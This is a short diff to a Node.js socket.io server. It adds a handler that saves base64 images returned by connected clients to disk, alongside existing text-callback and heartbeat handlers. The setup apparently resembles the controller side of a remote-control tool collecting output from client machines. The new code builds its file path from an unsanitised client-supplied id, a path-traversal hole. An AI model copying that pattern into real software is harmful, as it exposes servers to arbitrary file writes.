@@ -34,7 +34,7 @@ io.on('connection', function(socket){
   socket.on("beat", function(data) {
     checkClient(data, '[C] Client disconnected but reconnected with same id: '.yellow + data.id.yellow.bold, socket);
   });
-  socket.on("callback",function(data) {
+  socket.on("callbackText",function(data) {
     var ok = false;
     for(i=0;i<clients.length;i++) {
       if(clients[i].id == data.id) {
@@ -43,6 +43,23 @@ io.on('connection', function(socket){
     }
     if(ok) {
       clog('[C] Client: '.green + data.id.green.bold + ' returned data: \n\n----------\n'.green + data.data.green.bold + '----------\n'.green);
+    }
+  });
+  socket.on("callbackImageBase64",function(data) {
+    var ok = false;
+    for(i=0;i<clients.length;i++) {
+      if(clients[i].id == data.id) {
+        ok = true;
+      }
+    }
+    if(ok) {
+      var imgpath = 'dviide/return/' + data.id + new Date().getTime() + '.png';
+      fs.writeFile(imgpath, data.data, 'base64', function(err) {
+        if(err) {
+          clog(err.red);
+        }
+      });
+      clog('[C] Client: '.green + data.id.green.bold + ' returned image. Saved to: '.green + imgpath.green.bold);
     }
   });
   socket.on('disconnect', function() {
